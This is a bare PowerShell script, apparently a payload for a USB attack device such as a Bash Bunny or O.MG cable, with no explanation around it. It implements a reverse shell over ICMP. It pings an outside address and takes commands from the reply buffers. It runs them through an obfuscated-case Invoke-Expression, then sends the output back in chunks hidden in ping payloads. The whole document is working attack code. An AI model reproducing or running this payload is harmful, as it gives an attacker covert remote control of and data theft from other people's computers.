$Delay=5;
$BufferSize=128;
$ICMPBunny=New-Object System.Net.NetworkInformation.Ping;
$PingBB=New-Object System.Net.NetworkInformation.PingOptions;
$PingBB.DontFragment = $True;$NeverGonnaGiveYouUp = ([text.encoding]::ASCII).GetBytes('Bunny@PS '+(gl).Path+'> ');
$ICMPBunny.Send($IP,60 * 1000, $NeverGonnaGiveYouUp, $PingBB) | Out-Null;while ($true){$NeverGonnaGiveYouUp=([text.encoding]::ASCII).GetBytes('');
$reply=$ICMPBunny.Send($IP,60 * 1000, $NeverGonnaGiveYouUp, $PingBB);if ($reply.Buffer){$response=([text.encoding]::ASCII).GetString($reply.Buffer);
$result=(Invoke-eXprEssIon -Command $response 2>&1 | Out-String );$NeverGonnaGiveYouUp = ([text.encoding]::ASCII).GetBytes($result);$index=[math]::floor($NeverGonnaGiveYouUp.length/$BufferSize);$i = 0;if($NeverGonnaGiveYouUp.length -gt $BufferSize){while ($i -lt $index ){$NGGYU2 = $NeverGonnaGiveYouUp[($i*$BufferSize)..(($i+1)*$BufferSize-1)];$ICMPBunny.Send($IP,60 * 10000, $NGGYU2, $PingBB) | Out-Null;$i +=1;};
$remainingindex=$NeverGonnaGiveYouUp.Length % $BufferSize;if($remainingindex -ne 0){$NGGYU2 = $NeverGonnaGiveYouUp[($i*$BufferSize)..($NeverGonnaGiveYouUp.Length)];$ICMPBunny.Send($IP,60 * 10000, $NGGYU2, $PingBB) | Out-Null}}else{$ICMPBunny.Send($IP,60 * 10000, $NeverGonnaGiveYouUp, $PingBB) | Out-Null};$NeverGonnaGiveYouUp = ([text.encoding]::ASCII).GetBytes("`nO.MG@PS " + (pwd).Path + '> ');
$ICMPBunny.Send($IP,60 * 1000, $NeverGonnaGiveYouUp, $PingBB) | Out-Null}else{Start-Sleep -Seconds $Delay}}
